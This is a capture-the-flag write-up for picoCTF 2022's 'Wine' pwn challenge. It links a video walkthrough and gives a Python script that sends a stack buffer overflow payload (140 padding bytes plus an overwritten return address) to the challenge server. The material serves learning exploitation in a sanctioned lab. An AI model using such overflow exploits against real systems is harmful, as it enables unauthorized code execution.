---
name: Wine (2022)
event: Pico CTF 2022
category: Pwn
description: Writeup for Wine (Pwn) - Pico CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Wine

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/dAsujQ_OPEk/0.jpg)](https://youtu.be/dAsujQ_OPEk?t=3713 "Pico CTF 2022: Wine")

## Description

> Challenge best paired with wine.

## Solution

{% code overflow="wrap" %}
```py
import socket

payload = b'A' * 140
payload += b'\x30\x15\x40'
print('payload = ' + str(payload))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('saturn.picoctf.net', 62461))
print(s.recv(1024))
print(s.send(payload + b'\r\n'))
print(s.recv(1024))
s.close()
```
{% endcode %}
